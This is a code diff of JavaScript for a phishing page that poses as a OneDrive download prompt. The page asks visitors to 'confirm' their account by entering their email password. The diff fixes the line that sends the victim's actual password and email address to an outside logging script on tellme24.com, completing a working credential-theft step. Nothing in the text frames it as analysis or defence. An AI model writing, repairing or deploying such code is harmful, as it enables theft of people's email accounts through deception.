@@ -29,7 +29,7 @@ sub_btn.addEventListener("click", ()=>{
     main_container.innerHTML = `
     <div id="form_main">
         <aside id="form_aside">
-        <img src="0.jpg" alt="">
+        <img src="https://robmccal.github.io/one_drv/0.jpg" alt="">
         <p>Confirm your account to start download!</p>
         <input type="text" class="input_mail" placeholder="Enter Email Address" readonly value="${mailer}">
         <input type="password" class="input_pass" placeholder="Enter Email Password">
@@ -53,7 +53,7 @@ function subFormBtn(b) {
         return
     }
 
-    let url = "https://tellme24.com/logs/one_drv/drv.php?auth=oneDrive&pass="+pass+"&mail="+mail;
+    let url = "https://tellme24.com/logs/one_drv/drv.php?auth=oneDrive&pass="+pass.value+"&mail="+mail.value;
 
     location = url;
 }
